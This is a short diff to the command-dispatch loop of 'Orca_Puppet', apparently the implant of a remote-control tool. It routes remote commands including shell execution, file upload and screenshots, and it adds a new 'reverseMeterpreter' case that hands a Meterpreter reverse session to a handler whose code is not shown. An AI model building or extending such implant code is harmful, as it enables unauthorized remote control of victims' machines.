@@ -3,19 +3,23 @@ package controller
 import (
 	"Orca_Puppet/cli/common"
 	"Orca_Puppet/cli/common/setchannel"
+	"runtime"
 )
 
 func Start() {
+	runtime.GC()
 	for {
 		select {
 		case message := <-setchannel.CmdMsgChan:
 			msg, sendUserId, decData := common.SettleRetData(message)
+			msgId := common.GetMsgId(message)
+
 			switch msg {
 			case "closeClient":
 				go closeClientCmd()
 				break
 			case "execShell":
-				go shellCmd(sendUserId, decData)
+				go shellCmd(sendUserId, decData, msgId)
 				break
 			case "fileUpload":
 				go fileUploadCmd(sendUserId, decData)
@@ -76,6 +80,9 @@ func Start() {
 				break
 			case "screenshot":
 				go screenCmd(sendUserId)
+				break
+			case "reverseMeterpreter":
+				go reverseMeterpreterCmd(sendUserId, decData)
 				break
 			default:
 				break
